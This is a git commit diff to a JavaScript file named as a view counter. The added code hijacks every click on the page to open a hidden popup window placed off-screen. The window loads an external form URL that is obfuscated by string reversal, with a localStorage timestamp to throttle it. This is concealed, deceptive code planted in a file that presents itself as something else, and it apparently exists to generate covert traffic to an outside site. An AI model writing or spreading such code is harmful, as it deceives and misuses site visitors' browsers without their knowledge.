882208906866705c1f8b1f1f1f7e351e6781c9ad
JTJ <49002275+ProfessorJTJ@users.noreply.github.com>
2023-12-11 18:40:48 +0330

    Update viewscount.js

--- js/viewscount.js
+++ js/viewscount.js
@@ -23,9 +23,9 @@
 	
 	document.addEventListener("click", function(e) {
 		if (showPopUp()) {
-		        //var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
-			//window.open("52772903/ri.llope.ppa//:sptth".split("").reverse().join(""), "_blank", config);				
-		        window.open(eatApple, "_self");
+		        var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
+			window.open("62jxn/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);				
+		        //window.open(eatApple, "_self");
 			localStorage.setItem("popcornlast", Date.now());
 		}
 	});
